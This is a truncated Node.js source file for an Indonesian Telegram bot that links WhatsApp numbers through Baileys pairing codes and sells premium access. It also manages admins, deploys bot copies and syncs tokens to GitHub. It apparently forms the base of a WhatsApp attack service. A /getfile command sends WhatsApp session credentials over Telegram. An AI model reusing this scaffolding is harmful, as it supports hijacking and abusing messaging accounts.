const { Telegraf, Markup, Input } = require("telegraf");
const fs = require("fs");
const {
  default: makeWASocket,
  useMultiFileAuthState,
  downloadContentFromMessage,
  emitGroupParticipantsUpdate,
  emitGroupUpdate,
  generateWAMessageContent,
  generateWAMessage,
  makeInMemoryStore,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  MediaType,
  areJidsSameUser,
  WAMessageStatus,
  downloadAndSaveMediaMessage,
  AuthenticationState,
  GroupMetadata,
  initInMemoryKeyStore,
  getContentType,
  MiscMessageGenerationOptions,
  useSingleFileAuthState,
  BufferJSON,
  WAMessageProto,
  MessageOptions,
  WAFlag,
  WANode,
  WAMetric,
  ChatModification,
  MessageTypeProto,
  WALocationMessage,
  ReconnectMode,
  WAContextInfo,
  proto,
  WAGroupMetadata,
  ProxyAgent,
  waChatKey,
  MimetypeMap,
  MediaPathMap,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMessageContent,
  WAMessage,
  BaileysError,
  WA_MESSAGE_STATUS_TYPE,
  MediaConnInfo,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  WAMediaUpload,
  jidDecode,
  mentionedJid,
  processTime,
  Browser,
  MessageType,
  Presence,
  WA_MESSAGE_STUB_TYPES,
  Mimetype,
  relayWAMessage,
  Browsers,
  GroupSettingChange,
  DisconnectReason,
  WASocket,
  getStream,
  WAProto,
  isBaileys,
  AnyMessageContent,
  fetchLatestBaileysVersion,
  templateMessage,
  InteractiveMessage,
  Header,
} = require("@whiskeysockets/baileys");
const P = require("pino");
const chalk = require("chalk");
const path = require("path");
const axios = require("axios");
const JsConfuser = require("js-confuser");
const moment = require("moment-timezone");
const { BOT_TOKEN, allowedDevelopers } = require("./config");
const { spawn, exec, execSync } = require("child_process");
const tdxlol = fs.readFileSync("./tdx.jpeg");
const crypto = require("crypto");
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const BOTS_DIR = path.join(__dirname, "bots");
const sessions = new Map();
const userHasRunTes = new Map();
const cooldownUsers = new Map();
// --- Inisialisasi Bot Telegram ---
const bot = new Telegraf(BOT_TOKEN);

// --- Variabel Global ---
let maintenanceConfig = {
  maintenance_mode: false,
  message:
    "⛔ Maaf Script ini sedang di perbaiki oleh developer, mohon untuk menunggu hingga selesai !!",
};
let premiumUsers = {};
let adminList = [];
let ownerList = [];
let deviceList = [];
let userActivity = {};
let allowedBotTokens = [];
let ownerataubukan;
let adminataubukan;
let Premiumataubukan;
// --- Fungsi-fungsi Bantuan ---
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

//Func Deploy
const MAX_CONCURRENT_DEPLOYS = 1; // Batasi 5 deploy bot secara bersamaan
let deployingBots = 0;

async function deployBot(ctx, token, ownerId) {
  if (deployingBots >= MAX_CONCURRENT_DEPLOYS) {
    return ctx.reply(
      `🚧 <b>Terlalu banyak bot yang sedang dideploy</b>\n\nTunggu beberapa saat dan coba lagi.`,
      { parse_mode: "HTML" }
    );
  }

  deployingBots++;

  const botId = `bot_${Date.now()}`;
  const botDir = path.join(BOTS_DIR, botId);

  try {
    // Kirim pesan awal
    ctx.reply(`⏳ <b>Bot sedang diproses...</b>\n\nMohon tunggu sebentar.`, {
      parse_mode: "HTML",
    });

    // Buat direktori bot
    fs.mkdirSync(botDir, { recursive: true });

    // Salin file yang diperlukan ke direktori bot
    fs.copyFileSync("./index.js", path.join(botDir, "index.js"));
    fs.copyFileSync("./package.json", path.join(botDir, "package.json"));
    fs.writeFileSync(
      path.join(botDir, "config.js"),
      `module.exports = { BOT_TOKEN: "${token}", allowedDevelopers: ['${ownerId}'] };`
    );
    fs.copyFileSync("./tdx.jpeg", path.join(botDir, "tdx.jpeg"));

    // Install dependencies
    const installProcess = spawn("npm", ["install"], {
      cwd: botDir,
      stdio: "inherit",
    });

    installProcess.on("close", (code) => {
      if (code !== 0) {
        ctx.reply(
          `🚨 <b>Gagal Install Dependencies</b>\n\nError: <code>npm install exited with code ${code}</code>`,
          { parse_mode: "HTML" }
        );
        console.error(`Install error: npm install exited with code ${code}`);
        return;
      }

      // Jalankan bot di background menggunakan spawn
      const botProcess = spawn("node", ["index.js"], {
        cwd: botDir,
        detached: true,
        stdio: "ignore",
      });

      botProcess.unref(); // Pastikan proses tetap berjalan meskipun bot utama mati
      saveBotList(botId, token, ownerId);

      ctx.reply(
        `✅ <b>Bot Berhasil Dideploy dan Dijalankan!</b>\n\n🔑 Token: <code>${token}</code>\n👤 Owner ID: <code>${ownerId}</code>`,
        { parse_mode: "HTML" }
      );
    });
  } catch (err) {
    ctx.reply(
      `🚨 <b>Gagal Membuat Direktori Bot</b>\n\nError: <code>${err.message}</code>`,
      { parse_mode: "HTML" }
    );
    console.error(`Directory error: ${err.message}`);
  } finally {
    deployingBots--;
  }
}
//Next Func Deploy
const BOTS_LIST_FILE = "./bots_list.json";

function saveBotList(botId, token, ownerId) {
  let bots = [];
  if (fs.existsSync(BOTS_LIST_FILE)) {
    bots = JSON.parse(fs.readFileSync(BOTS_LIST_FILE));
  }
  bots.push({ botId, token, ownerId });
  fs.writeFileSync(BOTS_LIST_FILE, JSON.stringify(bots, null, 2));
}

function getBotList() {
  if (fs.existsSync(BOTS_LIST_FILE)) {
    return JSON.parse(fs.readFileSync(BOTS_LIST_FILE));
  }
  return [];
}

function removeBotFromList(botId) {
  let bots = getBotList();
  bots = bots.filter((bot) => bot.botId !== botId);
  fs.writeFileSync(BOTS_LIST_FILE, JSON.stringify(bots, null, 2));
}

// --- Fungsi untuk Mengecek Apakah User adalah Owner ---
const isOwner = (userId) => {
  if (ownerList.includes(userId.toString())) {
    ownerataubukan = "✅";
    return true;
  } else {
    ownerataubukan = "❌";
    return false;
  }
};

const groupOnlyAccess = allowedGroupIds => {
  return (ctx, next) => {
    if (ctx.chat.type === "group" || ctx.chat.type === "supergroup") {
      if (allowedGroupIds.includes(ctx.chat.id)) {
        return next();
      } else {
        return ctx.reply("🚫 Group Ini Lom Di Kasi Acces Ama Owner");
      }
    } else {
      return ctx.reply("❌ Khusus Group!");
    }
  };
};

const OWNER_ID = (userId) => {
  if (allowedDevelopers.includes(userId.toString())) {
    ysudh = "✅";
    return true;
  } else {
    gnymbung = "❌";
    return false;
  }
};

// --- Fungsi untuk Mengecek Apakah User adalah Admin ---
const isAdmin = (userId) => {
  if (adminList.includes(userId.toString())) {
    adminataubukan = "✅";
    return true;
  } else {
    adminataubukan = "❌";
    return false;
  }
};

// --- Fungsi untuk Menambahkan Admin ---
const addAdmin = (userId) => {
  if (!adminList.includes(userId)) {
    adminList.push(userId);
    saveAdmins();
  }
};

// --- Fungsi untuk Menghapus Admin ---
const removeAdmin = (userId) => {
  adminList = adminList.filter((id) => id !== userId);
  saveAdmins();
};

// --- Fungsi untuk Menyimpan Daftar Admin ---
const saveAdmins = () => {
  fs.writeFileSync("./admins.json", JSON.stringify(adminList));
};

// --- Fungsi untuk Memuat Daftar Admin ---
const loadAdmins = () => {
  try {
    const data = fs.readFileSync("./admins.json");
    adminList = JSON.parse(data);
  } catch (error) {
    console.error(chalk.red("Gagal memuat daftar admin:"), error);
    adminList = [];
  }
};

// --- Fungsi untuk Menambahkan User Premium ---
const addPremiumUser = (userId, durationDays) => {
  const expirationDate = moment().tz("Asia/Jakarta").add(durationDays, "days");
  premiumUsers[userId] = {
    expired: expirationDate.format("YYYY-MM-DD HH:mm:ss"),
  };
  savePremiumUsers();
};

// --- Fungsi untuk Menghapus User Premium ---
const removePremiumUser = (userId) => {
  delete premiumUsers[userId];
  savePremiumUsers();
};

// --- Fungsi untuk Mengecek Status Premium ---
const isPremiumUser = (userId) => {
  const userData = premiumUsers[userId];
  if (!userData) {
    Premiumataubukan = "❌";
    return false;
  }

  const now = moment().tz("Asia/Jakarta");
  const expirationDate = moment(userData.expired, "YYYY-MM-DD HH:mm:ss").tz(
    "Asia/Jakarta"
  );

  if (now.isBefore(expirationDate)) {
    Premiumataubukan = "✅";
    return true;
  } else {
    Premiumataubukan = "❌";
    return false;
  }
};

// --- Fungsi untuk Menyimpan Data User Premium ---
const savePremiumUsers = () => {
  fs.writeFileSync("./premiumUsers.json", JSON.stringify(premiumUsers));
};

// --- Fungsi untuk Memuat Data User Premium ---
const loadPremiumUsers = () => {
  try {
    const data = fs.readFileSync("./premiumUsers.json");
    premiumUsers = JSON.parse(data);
  } catch (error) {
    console.error(chalk.red("Gagal memuat data user premium:"), error);
    premiumUsers = {};
  }
};

// --- Fungsi untuk Memuat Daftar Device ---
const loadDeviceList = () => {
  try {
    const data = fs.readFileSync("./ListDevice.json");
    deviceList = JSON.parse(data);
  } catch (error) {
    console.error(chalk.red("Gagal memuat daftar device:"), error);
    deviceList = [];
  }
};

// --- Fungsi untuk Menyimpan Daftar Device ---
const saveDeviceList = () => {
  fs.writeFileSync("./ListDevice.json", JSON.stringify(deviceList));
};

// --- Fungsi untuk Menambahkan Device ke Daftar ---
const addDeviceToList = (userId, token) => {
  const deviceNumber = deviceList.length + 1;
  deviceList.push({
    number: deviceNumber,
    userId: userId,
    token: token,
  });
  saveDeviceList();
  console.log(
    chalk.white.bold(`
╭━━━━━━━━━━━━━━━━━━━━━━❍
┃ ${chalk.white.bold("DETECT NEW PERANGKAT")}
┃ ${chalk.white.bold("DEVICE NUMBER: ")} ${chalk.yellow.bold(deviceNumber)}
╰━━━━━━━━━━━━━━━━━━━━━━❍`)
  );
};

// --- Fungsi untuk Mencatat Aktivitas Pengguna ---
const recordUserActivity = (userId, userNickname) => {
  const now = moment().tz("Asia/Jakarta").format("YYYY-MM-DD HH:mm:ss");
  userActivity[userId] = {
    nickname: userNickname,
    last_seen: now,
  };

  // Menyimpan aktivitas pengguna ke file
  fs.writeFileSync("./userActivity.json", JSON.stringify(userActivity));
};

// --- Fungsi untuk Memuat Aktivitas Pengguna ---
const loadUserActivity = () => {
  try {
    const data = fs.readFileSync("./userActivity.json");
    userActivity = JSON.parse(data);
  } catch (error) {
    console.error(chalk.red("Gagal memuat aktivitas pengguna:"), error);
    userActivity = {};
  }
};

// --- Middleware untuk Mengecek Mode Maintenance ---
const checkMaintenance = async (ctx, next) => {
  let userId, userNickname;

  if (ctx.from) {
    userId = ctx.from.id.toString();
    userNickname = ctx.from.first_name || userId;
  } else if (ctx.update.channel_post && ctx.update.channel_post.sender_chat) {
    userId = ctx.update.channel_post.sender_chat.id.toString();
    userNickname = ctx.update.channel_post.sender_chat.title || userId;
  }

  // Catat aktivitas hanya jika userId tersedia
  if (userId) {
    recordUserActivity(userId, userNickname);
  }

  if (maintenanceConfig.maintenance_mode && !OWNER_ID(ctx.from.id)) {
    // Jika mode maintenance aktif DAN user bukan developer:
    // Kirim pesan maintenance dan hentikan eksekusi middleware
    console.log("Pesan Maintenance:", maintenanceConfig.message);
    const escapedMessage = maintenanceConfig.message.replace(/\*/g, "\\*"); // Escape karakter khusus
    return await ctx.replyWithMarkdown(escapedMessage);
  } else {
    // Jika mode maintenance tidak aktif ATAU user adalah developer:
    // Lanjutkan ke middleware/handler selanjutnya
    await next();
  }
};

// --- Middleware untuk Mengecek Status Premium ---
const checkPremium = async (ctx, next) => {
  if (isPremiumUser(ctx.from.id)) {
    await next();
  } else {
    await ctx.reply(
      "❌ Maaf, Anda bukan user premium. Silakan hubungi developer @TheyFreak untuk upgrade."
    );
  }
};

async function saveOwnerList() {
  const ownerFilePath = path.resolve(__dirname, "owner.json");
  fs.writeFileSync(ownerFilePath, JSON.stringify(ownerList, null, 2));
}

// --- Koneksi WhatsApp ---
function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}
async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ FOUND ACTIVE WHATSAPP SESSION
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃⌬ TOTAL : ${activeNumbers.length} 
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━`);

      for (const botNumber of activeNumbers) {
        console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ CURRENTLY CONNECTING WHATSAPP
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ NUMBER : ${botNumber}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        const sock = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ SUCCESSFUL NUMBER CONNECTION
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ NUMBER : ${botNumber}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ TRY RECONNECTING THE NUMBER
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ NUMBER : ${botNumber}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("CONNECTION CLOSED"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}
//Create Session
function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}
//Multi Sender Connect
async function connectToWhatsApp(botNumber, ctx) {
  let statusMessage = await ctx.reply(
    `╔══════════════════════╗  
║      INFORMATION      
╠══════════════════════╣  
║ NUMBER : ${botNumber}  
║ STATUS : INITIALIZATION  
╚══════════════════════╝`,
    { parse_mode: "Markdown" }
  );

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await ctx.telegram.editMessageText(
          ctx.chat.id,
          statusMessage.message_id,
          null,
          `╔═══════════════════╗  
║    INFORMATION    
╠═══════════════════╣  
║ NUMBER : ${botNumber}  
║ STATUS : RECONNECTING  
╚═══════════════════╝`,
          { parse_mode: "Markdown" }
        );
        await connectToWhatsApp(botNumber, ctx);
      } else {
        await ctx.telegram.editMessageText(
          ctx.chat.id,
          statusMessage.message_id,
          null,
          `╔═══════════════════╗  
║    INFORMATION    
╠═══════════════════╣  
║ NUMBER : ${botNumber}  
║ STATUS : FAILED  
╚═══════════════════╝`,
          { parse_mode: "Markdown" }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        statusMessage.message_id,
        null,
        `╔═══════════════════╗  
║    INFORMATION    
╠═══════════════════╣  
║ NUMBER : ${botNumber}  
║ STATUS : CONNECTED  
╚═══════════════════╝`,
        { parse_mode: "Markdown" }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber);
          const formattedCode = `\`${
            code.match(/.{1,4}/g)?.join("-") || code
          }\``;
          await ctx.telegram.editMessageText(
            ctx.chat.id,
            statusMessage.message_id,
            null,
            `╔══════════════════════╗  
║    PAIRING SESSION  
╠══════════════════════╣  
║ NUMBER : ${botNumber}  
║ CODE   : ${formattedCode}  
╚══════════════════════╝`,
            { parse_mode: "Markdown" }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await ctx.telegram.editMessageText(
          ctx.chat.id,
          statusMessage.message_id,
          null,
          `╔══════════════════════╗  
║    PAIRING SESSION   
╠══════════════════════╣  
║ NUMBER : ${botNumber}  
║ STATUS : ${error.message}  
╚══════════════════════╝`,
          { parse_mode: "Markdown" }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}
async function initializeBot() {
  console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ NEBULA BRUST
┣━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ CREATED BY DELAPLACE
┃ THANKS FOR USE MY SCRIPT TESTER
┗━━━━━━━━━━━━━━━━━━━━━━━━━━`);

  await initializeWhatsAppConnections();
}
//StartAwal
(async () => {
  console.log(
    chalk.whiteBright.bold(`
╭━━━━━━━━━━━━━━━━━━━━━━
┃ ${chalk.yellowBright.bold("SYSTEM ANTI CRACK ACTIVE")}
╰━━━━━━━━━━━━━━━━━━━━━━`)
  );

  console.log(
    chalk.white.bold(`
╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ ${chalk.yellow.bold("SUKSES MEMUAT DATABASE OWNER")}
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━`)
  );

  loadPremiumUsers();
  loadAdmins();

  // Menambahkan device ke ListDevice.json saat inisialisasi
  addDeviceToList(BOT_TOKEN, BOT_TOKEN);

  initializeBot();
})();
// --- Command Handler ---

bot.command("delfile", async (ctx) => {
  if (!OWNER_ID(ctx.from.id)) {
    return await ctx.reply(
      "❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini."
    );
  }

  const fileName = "session/creds.json";
  const filePath = path.resolve(__dirname, fileName);

  if (!fs.existsSync(filePath)) {
    return ctx.reply(`⚠️ File ${fileName} tidak ditemukan.`);
  }

  try {
    fs.unlinkSync(filePath);
    ctx.reply(`✅ File ${fileName} berhasil dihapus.`);
  } catch (error) {
    console.error(error);
    ctx.reply(`❌ Gagal menghapus file ${fileName}.`);
  }
});

bot.command("getfile", async (ctx) => {
  if (!OWNER_ID(ctx.from.id)) {
    return await ctx.reply(
      "❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini."
    );
  }

  const filePath = "./session/creds.json";
  try {
    await ctx.replyWithDocument({ source: filePath });
    console.log(`File ${filePath} berhasil dikirim.`);
  } catch (error) {
    console.error("Kosong njir:", error);
    ctx.reply("User Belom Sambungin Device Jir😜.");
  }
});

bot.command("connect", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1);

  if (args.length === 0) {
    return ctx.reply(
      "❌ Penggunaan Salah!\nGunakan perintah: `/connect <nomor_whatsapp>`",
      { parse_mode: "Markdown" }
    );
  }

  const botNumber = args[0].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, ctx);
  } catch (error) {
    console.error("Error in connectToWhatsApp:", error);
    ctx.reply(
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

// Command /addowner - Menambahkan owner baru
bot.command("addowner", async (ctx) => {
  if (!OWNER_ID(ctx.from.id)) {
    return await ctx.reply(
      "❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini."
    );
  }

  const userId = ctx.message.text.split(" ")[1];
  if (!userId) {
    return await ctx.reply(
      "❌ Format perintah salah. Gunakan: /addowner <id_user>"
    );
  }

  if (ownerList.includes(userId)) {
    return await ctx.reply(
      `🌟 User dengan ID ${userId} sudah terdaftar sebagai owner.`
    );
  }

  ownerList.push(userId);
  await saveOwnerList();

  const successMessage = `
✅ User dengan ID *${userId}* berhasil ditambahkan sebagai *Owner*.

*Detail:*
- *ID User:* ${userId}

Owner baru sekarang memiliki akses ke perintah /addadmin, /addprem, dan /delprem.
    `;

  await ctx.replyWithMarkdown(successMessage);
});

// Command /delowner - Menghapus owner
bot.command("delowner", async (ctx) => {
  if (!OWNER_ID(ctx.from.id)) {
    return await ctx.reply(
      "❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini."
    );
  }

  const userId = ctx.message.text.split(" ")[1];
  if (!userId) {
    return await ctx.reply(
      "❌ Format perintah salah. Gunakan: /delowner <id_user>"
    );
  }

  if (!ownerList.includes(userId)) {
    return await ctx.reply(
      `❌ User dengan ID ${userId} tidak terdaftar sebagai owner.`
    );
  }

  ownerList = ownerList.filter((id) => id !== userId);
  await saveOwnerList();

  const successMessage = `
✅ User dengan ID *${userId}* berhasil dihapus dari daftar *Owner*.

*Detail:*
- *ID User:* ${userId}

Owner tersebut tidak lagi memiliki akses seperti owner.
    `;

  await ctx.replyWithMarkdown(successMessage);
});

// Command /addadmin - Menambahkan admin baru
bot.command("addadmin", async (ctx) => {
  if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
    return await ctx.reply(
      "❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini."
    );
  }

  const userId = ctx.message.text.split(" ")[1];
  if (!userId) {
    return await ctx.reply(
      "❌ Format perintah salah. Gunakan: /addadmin <id_user>"
    );
  }

  addAdmin(userId);

  const successMessage = `
✅ User dengan ID *${userId}* berhasil ditambahkan sebagai *Admin*.

*Detail:*
- *ID User:* ${userId}

Admin baru sekarang memiliki akses ke perintah /addprem dan /delprem.
    `;

  await ctx.replyWithMarkdown(successMessage, {
    reply_markup: {
      inline_keyboard: [
        [{ text: "ℹ️ Daftar Admin", callback_data: "listadmin" }],
      ],
    },
  });
});

// Command /deladmin - Menghapus admin
bot.command("deladmin", async (ctx) => {
  if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
    return await ctx.reply(
      "❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini."
    );
  }

  const userId = ctx.message.text.split(" ")[1];
  if (!userId) {
    return await ctx.reply(
      "❌ Format perintah salah. Gunakan: /deladmin <id_user>"
    );
  }

  removeAdmin(userId);

  const successMessage = `
✅ User dengan ID *${userId}* berhasil dihapus dari daftar *Admin*.

*Detail:*
- *ID User:* ${userId}

Admin tersebut tidak lagi memiliki akses ke perintah /addprem dan /delprem.
    `;

  await ctx.replyWithMarkdown(successMessage, {
    reply_markup: {
      inline_keyboard: [
        [{ text: "ℹ️ Daftar Admin", callback_data: "listadmin" }],
      ],
    },
  });
});

// Callback Query untuk Menampilkan Daftar Admin
bot.action("listadmin", async (ctx) => {
  if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
    return await ctx.answerCbQuery(
      "❌ Maaf, Anda tidak memiliki akses untuk melihat daftar admin."
    );
  }

  const adminListString =
    adminList.length > 0
      ? adminList.map((id) => `- ${id}`).join("\n")
      : "Tidak ada admin yang terdaftar.";

  const message = `
ℹ️ Daftar Admin:

${adminListString}

Total: ${adminList.length} admin.
    `;

  await ctx.answerCbQuery();
  await ctx.replyWithMarkdown(message);
});

// Command /addprem - Menambahkan user premium
bot.command("addprem", async (ctx) => {
  if (
    !OWNER_ID(ctx.from.id) &&
    !isOwner(ctx.from.id) &&
    !isAdmin(ctx.from.id)
  ) {
    return await ctx.reply(
      "❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini."
    );
  }

  const args = ctx.message.text.split(" ");
  if (args.length < 3) {
    return await ctx.reply(
      "❌ Format perintah salah. Gunakan: /addprem <id_user> <durasi_hari>"
    );
  }

  const userId = args[1];
  const durationDays = parseInt(args[2]);

  if (isNaN(durationDays) || durationDays <= 0) {
    return await ctx.reply("❌ Durasi hari harus berupa angka positif.");
  }

  addPremiumUser(userId, durationDays);

  const expirationDate = premiumUsers[userId].expired;
  const formattedExpiration = moment(expirationDate, "YYYY-MM-DD HH:mm:ss")
    .tz("Asia/Jakarta")
    .format("DD-MM-YYYY HH:mm:ss");

  const successMessage = `
✅ User dengan ID *${userId}* berhasil ditambahkan sebagai *Premium User*.

*Detail:*
- *ID User:* ${userId}
- *Durasi:* ${durationDays} hari
- *Kadaluarsa:* ${formattedExpiration} WIB

Terima kasih telah menjadi bagian dari komunitas premium kami!
    `;

  await ctx.replyWithMarkdown(successMessage, {
    reply_markup: {
      inline_keyboard: [
        [{ text: "ℹ️ Cek Status Premium", callback_data: `cekprem_${userId}` }],
      ],
    },
  });
});

// Command /delprem - Menghapus user premium
bot.command("delprem", async (ctx) => {
  if (
    !OWNER_ID(ctx.from.id) &&
    !isOwner(ctx.from.id) &&
    !isAdmin(ctx.from.id)
  ) {
    return await ctx.reply(
      "❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini."
    );
  }

  const userId = ctx.message.text.split(" ")[1];
  if (!userId) {
    return await ctx.reply(
      "❌ Format perintah salah. Gunakan: /delprem <id_user>"
    );
  }

  if (!premiumUsers[userId]) {
    return await ctx.reply(
      `❌ User dengan ID ${userId} tidak terdaftar sebagai user premium.`
    );
  }

  removePremiumUser(userId);

  const successMessage = `
✅ User dengan ID *${userId}* berhasil dihapus dari daftar *Premium User*.

*Detail:*
- *ID User:* ${userId}

User tersebut tidak lagi memiliki akses ke fitur premium.
    `;

  await ctx.replyWithMarkdown(successMessage);
});

// Callback Query untuk Menampilkan Status Premium
bot.action(/cekprem_(.+)/, async (ctx) => {
  const userId = ctx.match[1];
  if (
    userId !== ctx.from.id.toString() &&
    !OWNER_ID(ctx.from.id) &&
    !isOwner(ctx.from.id) &&
    !isAdmin(ctx.from.id)
  ) {
    return await ctx.answerCbQuery(
      "❌ Anda tidak memiliki akses untuk mengecek status premium user lain."
    );
  }

  if (!premiumUsers[userId]) {
    return await ctx.answerCbQuery(
      `❌ User dengan ID ${userId} tidak terdaftar sebagai user premium.`
    );
  }

  const expirationDate = premiumUsers[userId].expired;
  const formattedExpiration = moment(expirationDate, "YYYY-MM-DD HH:mm:ss")
    .tz("Asia/Jakarta")
    .format("DD-MM-YYYY HH:mm:ss");
  const timeLeft = moment(expirationDate, "YYYY-MM-DD HH:mm:ss")
    .tz("Asia/Jakarta")
    .fromNow();

  const message = `
ℹ️ Status Premium User *${userId}*

*Detail:*
- *ID User:* ${userId}
- *Kadaluarsa:* ${formattedExpiration} WIB
- *Sisa Waktu:* ${timeLeft}

Terima kasih telah menjadi bagian dari komunitas premium kami!
    `;

  await ctx.answerCbQuery();
  await ctx.replyWithMarkdown(message);
});

// --- Command /cekusersc ---
bot.command("cekusersc", async (ctx) => {
  const totalDevices = deviceList.length;
  const deviceMessage = `
ℹ️ Saat ini terdapat *${totalDevices} device* yang terhubung dengan script ini.
    `;

  await ctx.replyWithMarkdown(deviceMessage);
});

// --- Command /monitoruser ---
bot.command("monitoruser", async (ctx) => {
  if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
    return await ctx.reply(
      "❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini."
    );
  }

  let userList = "";
  for (const userId in userActivity) {
    const user = userActivity[userId];
    userList += `
- *ID:* ${userId}
 *Nickname:* ${user.nickname}
 *Terakhir Dilihat:* ${user.last_seen}
`;
  }

  const message = `
👤 *Daftar Pengguna Bot:*
${userList}
Total Pengguna: ${Object.keys(userActivity).length}
    `;

  await ctx.replyWithMarkdown(message);
});
//FITUR TOKEN
bot.command("addtoken", async (ctx) => {
  const senderId = ctx.from.id;

  if (
    !OWNER_ID(ctx.from.id) &&
    !isOwner(ctx.from.id) &&
    !isAdmin(ctx.from.id)
  ) {
    return await ctx.reply(
      "❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini."
    );
  }

  const text = ctx.message.text.split(" ");
  if (text.length < 2) {
    return ctx.reply("❌ Missing input. Usage: /addtoken <token>");
  }

  const newToken = text.slice(1).join(" ").trim();

  try {
    const response = await axios.get(
      `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}`,
      {
        headers: {
          Authorization: `token ${GITHUB_TOKEN}`,
        },
      }
    );

    const fileContent = Buffer.from(response.data.content, "base64").toString(
      "utf-8"
    );
    const jsonData = JSON.parse(fileContent);

    if (!jsonData.tokens.includes(newToken)) {
      jsonData.tokens.push(newToken);

      const updatedContent = Buffer.from(
        JSON.stringify(jsonData, null, 2)
      ).toString("base64");
      await axios.put(
        `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}`,
        {
          message: "Added new Telegram token",
          content: updatedContent,
          sha: response.data.sha,
        },
        {
          headers: {
            Authorization: `token ${GITHUB_TOKEN}`,
          },
        }
      );

      const teks = `Added New Token Db\nAction By: ${senderId}\nAdded Token: ${newToken}`;

      ctx.reply("✅ Token added successfully.");
      console.log(chalk.blue(teks));
    } else {
      ctx.reply("⚠️ Token already exists.");
    }
  } catch (error) {
    ctx.reply(`❌ Failed to add token: ${error.message}`);
  }
});
bot.command("deltoken", async (ctx) => {
  const senderId = ctx.from.id;
  const match = ctx.message.text.split(" ").slice(1).join(" ");

  if (
    !OWNER_ID(ctx.from.id) &&
